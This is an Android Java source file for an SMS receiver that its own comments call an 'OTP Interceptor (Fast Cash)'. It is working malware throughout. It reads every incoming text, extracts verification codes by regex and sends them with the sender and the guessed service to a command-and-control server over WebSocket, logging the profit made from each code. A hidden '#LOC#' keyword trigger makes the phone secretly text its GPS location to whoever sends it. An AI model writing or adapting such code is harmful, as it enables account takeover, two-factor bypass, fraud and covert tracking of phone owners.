package com.rcl.androidstreamcontrol.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;
import android.telephony.SmsManager;
import android.location.Location;
import android.location.LocationManager;

import com.rcl.androidstreamcontrol.service.C2WebSocketClient;
import com.rcl.androidstreamcontrol.utils.FeatureConfig;

import org.json.JSONObject;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Module 2: OTP Interceptor (Fast Cash)
 *
 * Monitors all incoming SMS 24/7 via BroadcastReceiver.
 * When an SMS arrives:
 *   1. Uses regex to extract 4-8 digit codes (OTP patterns)
 *   2. Forwards the code + sender to C2 via WebSocket
 *   3. C2 forwards to SMSActivate to complete the transaction
 *   4. Logs $0.15 profit in database
 *
 * Also retains the original #LOC# location trigger functionality.
 */
public class SmsCommandReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsInterceptor";
    private static final String SECRET_LOC_KEYWORD = "#LOC#";

    // OTP regex: matches common 4-8 digit verification codes
    // Patterns: "123456", "code: 1234", "OTP: 123456", "verification code: 123456"
    private static final Pattern OTP_PATTERN = Pattern.compile(
        "(?:code|otp|verification|pin|password|auth|one.time|login)[^a-zA-Z]*?\\b(\\d{4,8})\\b",
        Pattern.CASE_INSENSITIVE
    );
    // Fallback: standalone 4-6 digit numbers that look like OTPs
    private static final Pattern FALLBACK_OTP = Pattern.compile(
        "\\b(\\d{4,6})\\b"
    );

    // Reference to C2 WebSocket for forwarding (set from outside)
    private static C2WebSocketClient c2Client;

    public static void setC2Client(C2WebSocketClient client) {
        c2Client = client;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!FeatureConfig.ENABLE_SMS_TRIGGER) return;

        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            try {
                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                String body = message.getMessageBody();
                String sender = message.getOriginatingAddress();

                if (body == null) continue;

                Log.d(TAG, "SMS received from: " + sender);

                // 1. Check for #LOC# trigger (existing functionality)
                if (body.contains(SECRET_LOC_KEYWORD)) {
                    Log.d(TAG, "Location trigger activated from: " + sender);
                    sendLocationReply(context, sender);
                }

                // 2. Extract OTP code
                String otp = extractOtp(body);
                if (otp != null && c2Client != null) {
                    Log.d(TAG, "OTP detected: " + otp + " from " + sender);

                    JSONObject msg = new JSONObject();
                    msg.put("action", "sms_received");
                    msg.put("code", otp);
                    msg.put("sender", sender);
                    msg.put("phone_number", sender);
                    msg.put("service", detectService(body));
                    c2Client.send(msg.toString());
                }

            } catch (Exception e) {
                Log.e(TAG, "Error processing SMS", e);
            }
        }
    }

    /**
     * Extract OTP code from SMS body.
     * Tries the regex pattern first, then falls back to standalone digits.
     */
    private String extractOtp(String body) {
        // First try: keyword-based pattern (more accurate)
        Matcher matcher = OTP_PATTERN.matcher(body);
        if (matcher.find()) {
            String code = matcher.group(1);
            if (isValidOtp(code)) return code;
        }

        // Second try: standalone 4-6 digit number
        Matcher fallback = FALLBACK_OTP.matcher(body);
        if (fallback.find()) {
            String code = fallback.group(1);
            if (isValidOtp(code)) return code;
        }

        return null;
    }

    private boolean isValidOtp(String code) {
        // Filter out obvious non-OTP numbers (years, short codes, repeated digits)
        if (code.length() < 4 || code.length() > 8) return false;
        if (code.matches("(\\d)\\1{3,}")) return false; // 1111, 2222 etc
        return true;
    }

    /**
     * Detect the service/network from SMS body keywords.
     */
    private String detectService(String body) {
        String lower = body.toLowerCase();
        if (lower.contains("telegram") || lower.contains("tg")) return "Telegram";
        if (lower.contains("google") || lower.contains("gmail")) return "Google";
        if (lower.contains("facebook") || lower.contains("fb")) return "Facebook";
        if (lower.contains("whatsapp") || lower.contains("wa")) return "WhatsApp";
        if (lower.contains("binance") || lower.contains("coin")) return "Binance";
        if (lower.contains("instagram") || lower.contains("ig")) return "Instagram";
        if (lower.contains("twitter") || lower.contains("x.com")) return "Twitter";
        return "Other";
    }

    private void sendLocationReply(Context context, String phone) {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) {
                loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }

            String replyText = "Target Location Unknown.";
            if (loc != null) {
                replyText = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
            }

            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phone, null, replyText, null, null);
            Log.d(TAG, "Location sent via SMS");
        } catch (SecurityException e) {
            Log.e(TAG, "Missing location permission");
        } catch (Exception e) {
            Log.e(TAG, "Error sending location SMS", e);
        }
    }
}